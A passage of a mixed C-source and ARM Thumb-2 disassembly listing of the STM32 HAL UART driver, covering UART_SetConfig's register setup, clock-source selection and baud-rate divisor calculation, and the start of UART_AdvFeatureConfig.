  *  set OVER8 bit according to huart->Init.OverSampling value */
  tmpreg = (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling ;
 8005544:	68fb      	ldr	r3, [r7, #12]
 8005546:	689a      	ldr	r2, [r3, #8]
 8005548:	68fb      	ldr	r3, [r7, #12]
 800554a:	691b      	ldr	r3, [r3, #16]
 800554c:	431a      	orrs	r2, r3
 800554e:	68fb      	ldr	r3, [r7, #12]
 8005550:	695b      	ldr	r3, [r3, #20]
 8005552:	431a      	orrs	r2, r3
 8005554:	68fb      	ldr	r3, [r7, #12]
 8005556:	69db      	ldr	r3, [r3, #28]
 8005558:	4313      	orrs	r3, r2
 800555a:	627b      	str	r3, [r7, #36]	; 0x24
  MODIFY_REG(huart->Instance->CR1, USART_CR1_FIELDS, tmpreg);
 800555c:	68fb      	ldr	r3, [r7, #12]
 800555e:	681b      	ldr	r3, [r3, #0]
 8005560:	681a      	ldr	r2, [r3, #0]
 8005562:	4bb4      	ldr	r3, [pc, #720]	; (8005834 <UART_SetConfig+0x300>)
 8005564:	4013      	ands	r3, r2
 8005566:	68fa      	ldr	r2, [r7, #12]
 8005568:	6812      	ldr	r2, [r2, #0]
 800556a:	6a79      	ldr	r1, [r7, #36]	; 0x24
 800556c:	430b      	orrs	r3, r1
 800556e:	6013      	str	r3, [r2, #0]

  /*-------------------------- USART CR2 Configuration -----------------------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according
  * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 8005570:	68fb      	ldr	r3, [r7, #12]
 8005572:	681b      	ldr	r3, [r3, #0]
 8005574:	685b      	ldr	r3, [r3, #4]
 8005576:	f423 5140 	bic.w	r1, r3, #12288	; 0x3000
 800557a:	68fb      	ldr	r3, [r7, #12]
 800557c:	68da      	ldr	r2, [r3, #12]
 800557e:	68fb      	ldr	r3, [r7, #12]
 8005580:	681b      	ldr	r3, [r3, #0]
 8005582:	430a      	orrs	r2, r1
 8005584:	605a      	str	r2, [r3, #4]
  /* Configure
  * - UART HardWare Flow Control: set CTSE and RTSE bits according
  *   to huart->Init.HwFlowCtl value
  * - one-bit sampling method versus three samples' majority rule according
  *   to huart->Init.OneBitSampling (not applicable to LPUART) */
  tmpreg = (uint32_t)huart->Init.HwFlowCtl;
 8005586:	68fb      	ldr	r3, [r7, #12]
 8005588:	699b      	ldr	r3, [r3, #24]
 800558a:	627b      	str	r3, [r7, #36]	; 0x24

  if (!(UART_INSTANCE_LOWPOWER(huart)))
 800558c:	68fb      	ldr	r3, [r7, #12]
 800558e:	681b      	ldr	r3, [r3, #0]
 8005590:	4aa9      	ldr	r2, [pc, #676]	; (8005838 <UART_SetConfig+0x304>)
 8005592:	4293      	cmp	r3, r2
 8005594:	d004      	beq.n	80055a0 <UART_SetConfig+0x6c>
  {
    tmpreg |= huart->Init.OneBitSampling;
 8005596:	68fb      	ldr	r3, [r7, #12]
 8005598:	6a1b      	ldr	r3, [r3, #32]
 800559a:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 800559c:	4313      	orrs	r3, r2
 800559e:	627b      	str	r3, [r7, #36]	; 0x24
  }
  MODIFY_REG(huart->Instance->CR3, USART_CR3_FIELDS, tmpreg);
 80055a0:	68fb      	ldr	r3, [r7, #12]
 80055a2:	681b      	ldr	r3, [r3, #0]
 80055a4:	689b      	ldr	r3, [r3, #8]
 80055a6:	f423 6130 	bic.w	r1, r3, #2816	; 0xb00
 80055aa:	68fb      	ldr	r3, [r7, #12]
 80055ac:	681b      	ldr	r3, [r3, #0]
 80055ae:	6a7a      	ldr	r2, [r7, #36]	; 0x24
 80055b0:	430a      	orrs	r2, r1
 80055b2:	609a      	str	r2, [r3, #8]
  * - UART Clock Prescaler : set PRESCALER according to huart->Init.ClockPrescaler value */
  MODIFY_REG(huart->Instance->PRESC, USART_PRESC_PRESCALER, huart->Init.ClockPrescaler);
#endif /* USART_PRESC_PRESCALER */

  /*-------------------------- USART BRR Configuration -----------------------*/
  UART_GETCLOCKSOURCE(huart, clocksource);
 80055b4:	68fb      	ldr	r3, [r7, #12]
 80055b6:	681b      	ldr	r3, [r3, #0]
 80055b8:	4aa0      	ldr	r2, [pc, #640]	; (800583c <UART_SetConfig+0x308>)
 80055ba:	4293      	cmp	r3, r2
 80055bc:	d126      	bne.n	800560c <UART_SetConfig+0xd8>
 80055be:	4ba0      	ldr	r3, [pc, #640]	; (8005840 <UART_SetConfig+0x30c>)
 80055c0:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80055c4:	f003 0303 	and.w	r3, r3, #3
 80055c8:	2b03      	cmp	r3, #3
 80055ca:	d81b      	bhi.n	8005604 <UART_SetConfig+0xd0>
 80055cc:	a201      	add	r2, pc, #4	; (adr r2, 80055d4 <UART_SetConfig+0xa0>)
 80055ce:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80055d2:	bf00      	nop
 80055d4:	080055e5 	.word	0x080055e5
 80055d8:	080055f5 	.word	0x080055f5
 80055dc:	080055ed 	.word	0x080055ed
 80055e0:	080055fd 	.word	0x080055fd
 80055e4:	2301      	movs	r3, #1
 80055e6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055ea:	e080      	b.n	80056ee <UART_SetConfig+0x1ba>
 80055ec:	2302      	movs	r3, #2
 80055ee:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055f2:	e07c      	b.n	80056ee <UART_SetConfig+0x1ba>
 80055f4:	2304      	movs	r3, #4
 80055f6:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80055fa:	e078      	b.n	80056ee <UART_SetConfig+0x1ba>
 80055fc:	2308      	movs	r3, #8
 80055fe:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005602:	e074      	b.n	80056ee <UART_SetConfig+0x1ba>
 8005604:	2310      	movs	r3, #16
 8005606:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800560a:	e070      	b.n	80056ee <UART_SetConfig+0x1ba>
 800560c:	68fb      	ldr	r3, [r7, #12]
 800560e:	681b      	ldr	r3, [r3, #0]
 8005610:	4a8c      	ldr	r2, [pc, #560]	; (8005844 <UART_SetConfig+0x310>)
 8005612:	4293      	cmp	r3, r2
 8005614:	d138      	bne.n	8005688 <UART_SetConfig+0x154>
 8005616:	4b8a      	ldr	r3, [pc, #552]	; (8005840 <UART_SetConfig+0x30c>)
 8005618:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800561c:	f003 030c 	and.w	r3, r3, #12
 8005620:	2b0c      	cmp	r3, #12
 8005622:	d82d      	bhi.n	8005680 <UART_SetConfig+0x14c>
 8005624:	a201      	add	r2, pc, #4	; (adr r2, 800562c <UART_SetConfig+0xf8>)
 8005626:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800562a:	bf00      	nop
 800562c:	08005661 	.word	0x08005661
 8005630:	08005681 	.word	0x08005681
 8005634:	08005681 	.word	0x08005681
 8005638:	08005681 	.word	0x08005681
 800563c:	08005671 	.word	0x08005671
 8005640:	08005681 	.word	0x08005681
 8005644:	08005681 	.word	0x08005681
 8005648:	08005681 	.word	0x08005681
 800564c:	08005669 	.word	0x08005669
 8005650:	08005681 	.word	0x08005681
 8005654:	08005681 	.word	0x08005681
 8005658:	08005681 	.word	0x08005681
 800565c:	08005679 	.word	0x08005679
 8005660:	2300      	movs	r3, #0
 8005662:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005666:	e042      	b.n	80056ee <UART_SetConfig+0x1ba>
 8005668:	2302      	movs	r3, #2
 800566a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800566e:	e03e      	b.n	80056ee <UART_SetConfig+0x1ba>
 8005670:	2304      	movs	r3, #4
 8005672:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005676:	e03a      	b.n	80056ee <UART_SetConfig+0x1ba>
 8005678:	2308      	movs	r3, #8
 800567a:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 800567e:	e036      	b.n	80056ee <UART_SetConfig+0x1ba>
 8005680:	2310      	movs	r3, #16
 8005682:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 8005686:	e032      	b.n	80056ee <UART_SetConfig+0x1ba>
 8005688:	68fb      	ldr	r3, [r7, #12]
 800568a:	681b      	ldr	r3, [r3, #0]
 800568c:	4a6a      	ldr	r2, [pc, #424]	; (8005838 <UART_SetConfig+0x304>)
 800568e:	4293      	cmp	r3, r2
 8005690:	d12a      	bne.n	80056e8 <UART_SetConfig+0x1b4>
 8005692:	4b6b      	ldr	r3, [pc, #428]	; (8005840 <UART_SetConfig+0x30c>)
 8005694:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8005698:	f403 6340 	and.w	r3, r3, #3072	; 0xc00
 800569c:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 80056a0:	d01a      	beq.n	80056d8 <UART_SetConfig+0x1a4>
 80056a2:	f5b3 6f40 	cmp.w	r3, #3072	; 0xc00
 80056a6:	d81b      	bhi.n	80056e0 <UART_SetConfig+0x1ac>
 80056a8:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 80056ac:	d00c      	beq.n	80056c8 <UART_SetConfig+0x194>
 80056ae:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 80056b2:	d815      	bhi.n	80056e0 <UART_SetConfig+0x1ac>
 80056b4:	2b00      	cmp	r3, #0
 80056b6:	d003      	beq.n	80056c0 <UART_SetConfig+0x18c>
 80056b8:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 80056bc:	d008      	beq.n	80056d0 <UART_SetConfig+0x19c>
 80056be:	e00f      	b.n	80056e0 <UART_SetConfig+0x1ac>
 80056c0:	2300      	movs	r3, #0
 80056c2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056c6:	e012      	b.n	80056ee <UART_SetConfig+0x1ba>
 80056c8:	2302      	movs	r3, #2
 80056ca:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056ce:	e00e      	b.n	80056ee <UART_SetConfig+0x1ba>
 80056d0:	2304      	movs	r3, #4
 80056d2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056d6:	e00a      	b.n	80056ee <UART_SetConfig+0x1ba>
 80056d8:	2308      	movs	r3, #8
 80056da:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056de:	e006      	b.n	80056ee <UART_SetConfig+0x1ba>
 80056e0:	2310      	movs	r3, #16
 80056e2:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23
 80056e6:	e002      	b.n	80056ee <UART_SetConfig+0x1ba>
 80056e8:	2310      	movs	r3, #16
 80056ea:	f887 3023 	strb.w	r3, [r7, #35]	; 0x23

  /* Check LPUART instance */
  if (UART_INSTANCE_LOWPOWER(huart))
 80056ee:	68fb      	ldr	r3, [r7, #12]
 80056f0:	681b      	ldr	r3, [r3, #0]
 80056f2:	4a51      	ldr	r2, [pc, #324]	; (8005838 <UART_SetConfig+0x304>)
 80056f4:	4293      	cmp	r3, r2
 80056f6:	d17a      	bne.n	80057ee <UART_SetConfig+0x2ba>
  {
    /* Retrieve frequency clock */
    switch (clocksource)
 80056f8:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80056fc:	2b08      	cmp	r3, #8
 80056fe:	d824      	bhi.n	800574a <UART_SetConfig+0x216>
 8005700:	a201      	add	r2, pc, #4	; (adr r2, 8005708 <UART_SetConfig+0x1d4>)
 8005702:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005706:	bf00      	nop
 8005708:	0800572d 	.word	0x0800572d
 800570c:	0800574b 	.word	0x0800574b
 8005710:	08005735 	.word	0x08005735
 8005714:	0800574b 	.word	0x0800574b
 8005718:	0800573b 	.word	0x0800573b
 800571c:	0800574b 	.word	0x0800574b
 8005720:	0800574b 	.word	0x0800574b
 8005724:	0800574b 	.word	0x0800574b
 8005728:	08005743 	.word	0x08005743
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 800572c:	f7fe fe6c 	bl	8004408 <HAL_RCC_GetPCLK1Freq>
 8005730:	61f8      	str	r0, [r7, #28]
        break;
 8005732:	e010      	b.n	8005756 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005734:	4b44      	ldr	r3, [pc, #272]	; (8005848 <UART_SetConfig+0x314>)
 8005736:	61fb      	str	r3, [r7, #28]
        break;
 8005738:	e00d      	b.n	8005756 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 800573a:	f7fe fdcd 	bl	80042d8 <HAL_RCC_GetSysClockFreq>
 800573e:	61f8      	str	r0, [r7, #28]
        break;
 8005740:	e009      	b.n	8005756 <UART_SetConfig+0x222>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005742:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005746:	61fb      	str	r3, [r7, #28]
        break;
 8005748:	e005      	b.n	8005756 <UART_SetConfig+0x222>
      default:
        pclk = 0U;
 800574a:	2300      	movs	r3, #0
 800574c:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800574e:	2301      	movs	r3, #1
 8005750:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005754:	bf00      	nop
    }

    /* If proper clock source reported */
    if (pclk != 0U)
 8005756:	69fb      	ldr	r3, [r7, #28]
 8005758:	2b00      	cmp	r3, #0
 800575a:	f000 8107 	beq.w	800596c <UART_SetConfig+0x438>
      } /* if ( (lpuart_ker_ck_pres < (3 * huart->Init.BaudRate) ) ||
                (lpuart_ker_ck_pres > (4096 * huart->Init.BaudRate) )) */
#else
      /* No Prescaler applicable */
      /* Ensure that Frequency clock is in the range [3 * baudrate, 4096 * baudrate] */
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 800575e:	68fb      	ldr	r3, [r7, #12]
 8005760:	685a      	ldr	r2, [r3, #4]
 8005762:	4613      	mov	r3, r2
 8005764:	005b      	lsls	r3, r3, #1
 8005766:	4413      	add	r3, r2
 8005768:	69fa      	ldr	r2, [r7, #28]
 800576a:	429a      	cmp	r2, r3
 800576c:	d305      	bcc.n	800577a <UART_SetConfig+0x246>
          (pclk > (4096U * huart->Init.BaudRate)))
 800576e:	68fb      	ldr	r3, [r7, #12]
 8005770:	685b      	ldr	r3, [r3, #4]
 8005772:	031b      	lsls	r3, r3, #12
      if ((pclk < (3U * huart->Init.BaudRate)) ||
 8005774:	69fa      	ldr	r2, [r7, #28]
 8005776:	429a      	cmp	r2, r3
 8005778:	d903      	bls.n	8005782 <UART_SetConfig+0x24e>
      {
        ret = HAL_ERROR;
 800577a:	2301      	movs	r3, #1
 800577c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005780:	e0f4      	b.n	800596c <UART_SetConfig+0x438>
      }
      else
      {
        usartdiv = (uint32_t)(UART_DIV_LPUART(pclk, huart->Init.BaudRate));
 8005782:	69fb      	ldr	r3, [r7, #28]
 8005784:	2200      	movs	r2, #0
 8005786:	461c      	mov	r4, r3
 8005788:	4615      	mov	r5, r2
 800578a:	f04f 0200 	mov.w	r2, #0
 800578e:	f04f 0300 	mov.w	r3, #0
 8005792:	022b      	lsls	r3, r5, #8
 8005794:	ea43 6314 	orr.w	r3, r3, r4, lsr #24
 8005798:	0222      	lsls	r2, r4, #8
 800579a:	68f9      	ldr	r1, [r7, #12]
 800579c:	6849      	ldr	r1, [r1, #4]
 800579e:	0849      	lsrs	r1, r1, #1
 80057a0:	2000      	movs	r0, #0
 80057a2:	4688      	mov	r8, r1
 80057a4:	4681      	mov	r9, r0
 80057a6:	eb12 0a08 	adds.w	sl, r2, r8
 80057aa:	eb43 0b09 	adc.w	fp, r3, r9
 80057ae:	68fb      	ldr	r3, [r7, #12]
 80057b0:	685b      	ldr	r3, [r3, #4]
 80057b2:	2200      	movs	r2, #0
 80057b4:	603b      	str	r3, [r7, #0]
 80057b6:	607a      	str	r2, [r7, #4]
 80057b8:	e9d7 2300 	ldrd	r2, r3, [r7]
 80057bc:	4650      	mov	r0, sl
 80057be:	4659      	mov	r1, fp
 80057c0:	f7fa fd0c 	bl	80001dc <__aeabi_uldivmod>
 80057c4:	4602      	mov	r2, r0
 80057c6:	460b      	mov	r3, r1
 80057c8:	4613      	mov	r3, r2
 80057ca:	61bb      	str	r3, [r7, #24]
        if ((usartdiv >= LPUART_BRR_MIN) && (usartdiv <= LPUART_BRR_MAX))
 80057cc:	69bb      	ldr	r3, [r7, #24]
 80057ce:	f5b3 7f40 	cmp.w	r3, #768	; 0x300
 80057d2:	d308      	bcc.n	80057e6 <UART_SetConfig+0x2b2>
 80057d4:	69bb      	ldr	r3, [r7, #24]
 80057d6:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 80057da:	d204      	bcs.n	80057e6 <UART_SetConfig+0x2b2>
        {
          huart->Instance->BRR = usartdiv;
 80057dc:	68fb      	ldr	r3, [r7, #12]
 80057de:	681b      	ldr	r3, [r3, #0]
 80057e0:	69ba      	ldr	r2, [r7, #24]
 80057e2:	60da      	str	r2, [r3, #12]
 80057e4:	e0c2      	b.n	800596c <UART_SetConfig+0x438>
        }
        else
        {
          ret = HAL_ERROR;
 80057e6:	2301      	movs	r3, #1
 80057e8:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80057ec:	e0be      	b.n	800596c <UART_SetConfig+0x438>
      } /* if ( (pclk < (3 * huart->Init.BaudRate) ) || (pclk > (4096 * huart->Init.BaudRate) )) */
#endif /* USART_PRESC_PRESCALER */
    } /* if (pclk != 0) */
  }
  /* Check UART Over Sampling to set Baud Rate Register */
  else if (huart->Init.OverSampling == UART_OVERSAMPLING_8)
 80057ee:	68fb      	ldr	r3, [r7, #12]
 80057f0:	69db      	ldr	r3, [r3, #28]
 80057f2:	f5b3 4f00 	cmp.w	r3, #32768	; 0x8000
 80057f6:	d16a      	bne.n	80058ce <UART_SetConfig+0x39a>
  {
    switch (clocksource)
 80057f8:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80057fc:	2b08      	cmp	r3, #8
 80057fe:	d834      	bhi.n	800586a <UART_SetConfig+0x336>
 8005800:	a201      	add	r2, pc, #4	; (adr r2, 8005808 <UART_SetConfig+0x2d4>)
 8005802:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005806:	bf00      	nop
 8005808:	0800582d 	.word	0x0800582d
 800580c:	0800584d 	.word	0x0800584d
 8005810:	08005855 	.word	0x08005855
 8005814:	0800586b 	.word	0x0800586b
 8005818:	0800585b 	.word	0x0800585b
 800581c:	0800586b 	.word	0x0800586b
 8005820:	0800586b 	.word	0x0800586b
 8005824:	0800586b 	.word	0x0800586b
 8005828:	08005863 	.word	0x08005863
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 800582c:	f7fe fdec 	bl	8004408 <HAL_RCC_GetPCLK1Freq>
 8005830:	61f8      	str	r0, [r7, #28]
        break;
 8005832:	e020      	b.n	8005876 <UART_SetConfig+0x342>
 8005834:	efff69f3 	.word	0xefff69f3
 8005838:	40008000 	.word	0x40008000
 800583c:	40013800 	.word	0x40013800
 8005840:	40021000 	.word	0x40021000
 8005844:	40004400 	.word	0x40004400
 8005848:	00f42400 	.word	0x00f42400
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 800584c:	f7fe fdf2 	bl	8004434 <HAL_RCC_GetPCLK2Freq>
 8005850:	61f8      	str	r0, [r7, #28]
        break;
 8005852:	e010      	b.n	8005876 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005854:	4b4c      	ldr	r3, [pc, #304]	; (8005988 <UART_SetConfig+0x454>)
 8005856:	61fb      	str	r3, [r7, #28]
        break;
 8005858:	e00d      	b.n	8005876 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 800585a:	f7fe fd3d 	bl	80042d8 <HAL_RCC_GetSysClockFreq>
 800585e:	61f8      	str	r0, [r7, #28]
        break;
 8005860:	e009      	b.n	8005876 <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005862:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005866:	61fb      	str	r3, [r7, #28]
        break;
 8005868:	e005      	b.n	8005876 <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 800586a:	2300      	movs	r3, #0
 800586c:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800586e:	2301      	movs	r3, #1
 8005870:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005874:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 8005876:	69fb      	ldr	r3, [r7, #28]
 8005878:	2b00      	cmp	r3, #0
 800587a:	d077      	beq.n	800596c <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 800587c:	69fb      	ldr	r3, [r7, #28]
 800587e:	005a      	lsls	r2, r3, #1
 8005880:	68fb      	ldr	r3, [r7, #12]
 8005882:	685b      	ldr	r3, [r3, #4]
 8005884:	085b      	lsrs	r3, r3, #1
 8005886:	441a      	add	r2, r3
 8005888:	68fb      	ldr	r3, [r7, #12]
 800588a:	685b      	ldr	r3, [r3, #4]
 800588c:	fbb2 f3f3 	udiv	r3, r2, r3
 8005890:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005892:	69bb      	ldr	r3, [r7, #24]
 8005894:	2b0f      	cmp	r3, #15
 8005896:	d916      	bls.n	80058c6 <UART_SetConfig+0x392>
 8005898:	69bb      	ldr	r3, [r7, #24]
 800589a:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 800589e:	d212      	bcs.n	80058c6 <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 80058a0:	69bb      	ldr	r3, [r7, #24]
 80058a2:	b29b      	uxth	r3, r3
 80058a4:	f023 030f 	bic.w	r3, r3, #15
 80058a8:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 80058aa:	69bb      	ldr	r3, [r7, #24]
 80058ac:	085b      	lsrs	r3, r3, #1
 80058ae:	b29b      	uxth	r3, r3
 80058b0:	f003 0307 	and.w	r3, r3, #7
 80058b4:	b29a      	uxth	r2, r3
 80058b6:	8afb      	ldrh	r3, [r7, #22]
 80058b8:	4313      	orrs	r3, r2
 80058ba:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 80058bc:	68fb      	ldr	r3, [r7, #12]
 80058be:	681b      	ldr	r3, [r3, #0]
 80058c0:	8afa      	ldrh	r2, [r7, #22]
 80058c2:	60da      	str	r2, [r3, #12]
 80058c4:	e052      	b.n	800596c <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 80058c6:	2301      	movs	r3, #1
 80058c8:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 80058cc:	e04e      	b.n	800596c <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 80058ce:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 80058d2:	2b08      	cmp	r3, #8
 80058d4:	d827      	bhi.n	8005926 <UART_SetConfig+0x3f2>
 80058d6:	a201      	add	r2, pc, #4	; (adr r2, 80058dc <UART_SetConfig+0x3a8>)
 80058d8:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 80058dc:	08005901 	.word	0x08005901
 80058e0:	08005909 	.word	0x08005909
 80058e4:	08005911 	.word	0x08005911
 80058e8:	08005927 	.word	0x08005927
 80058ec:	08005917 	.word	0x08005917
 80058f0:	08005927 	.word	0x08005927
 80058f4:	08005927 	.word	0x08005927
 80058f8:	08005927 	.word	0x08005927
 80058fc:	0800591f 	.word	0x0800591f
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005900:	f7fe fd82 	bl	8004408 <HAL_RCC_GetPCLK1Freq>
 8005904:	61f8      	str	r0, [r7, #28]
        break;
 8005906:	e014      	b.n	8005932 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005908:	f7fe fd94 	bl	8004434 <HAL_RCC_GetPCLK2Freq>
 800590c:	61f8      	str	r0, [r7, #28]
        break;
 800590e:	e010      	b.n	8005932 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005910:	4b1d      	ldr	r3, [pc, #116]	; (8005988 <UART_SetConfig+0x454>)
 8005912:	61fb      	str	r3, [r7, #28]
        break;
 8005914:	e00d      	b.n	8005932 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005916:	f7fe fcdf 	bl	80042d8 <HAL_RCC_GetSysClockFreq>
 800591a:	61f8      	str	r0, [r7, #28]
        break;
 800591c:	e009      	b.n	8005932 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 800591e:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005922:	61fb      	str	r3, [r7, #28]
        break;
 8005924:	e005      	b.n	8005932 <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 8005926:	2300      	movs	r3, #0
 8005928:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 800592a:	2301      	movs	r3, #1
 800592c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005930:	bf00      	nop
    }

    if (pclk != 0U)
 8005932:	69fb      	ldr	r3, [r7, #28]
 8005934:	2b00      	cmp	r3, #0
 8005936:	d019      	beq.n	800596c <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 8005938:	68fb      	ldr	r3, [r7, #12]
 800593a:	685b      	ldr	r3, [r3, #4]
 800593c:	085a      	lsrs	r2, r3, #1
 800593e:	69fb      	ldr	r3, [r7, #28]
 8005940:	441a      	add	r2, r3
 8005942:	68fb      	ldr	r3, [r7, #12]
 8005944:	685b      	ldr	r3, [r3, #4]
 8005946:	fbb2 f3f3 	udiv	r3, r2, r3
 800594a:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 800594c:	69bb      	ldr	r3, [r7, #24]
 800594e:	2b0f      	cmp	r3, #15
 8005950:	d909      	bls.n	8005966 <UART_SetConfig+0x432>
 8005952:	69bb      	ldr	r3, [r7, #24]
 8005954:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005958:	d205      	bcs.n	8005966 <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 800595a:	69bb      	ldr	r3, [r7, #24]
 800595c:	b29a      	uxth	r2, r3
 800595e:	68fb      	ldr	r3, [r7, #12]
 8005960:	681b      	ldr	r3, [r3, #0]
 8005962:	60da      	str	r2, [r3, #12]
 8005964:	e002      	b.n	800596c <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005966:	2301      	movs	r3, #1
 8005968:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 800596c:	68fb      	ldr	r3, [r7, #12]
 800596e:	2200      	movs	r2, #0
 8005970:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 8005972:	68fb      	ldr	r3, [r7, #12]
 8005974:	2200      	movs	r2, #0
 8005976:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 8005978:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 800597c:	4618      	mov	r0, r3
 800597e:	3728      	adds	r7, #40	; 0x28
 8005980:	46bd      	mov	sp, r7
 8005982:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 8005986:	bf00      	nop
 8005988:	00f42400 	.word	0x00f42400

0800598c <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 800598c:	b480      	push	{r7}
 800598e:	b083      	sub	sp, #12
 8005990:	af00      	add	r7, sp, #0
 8005992:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

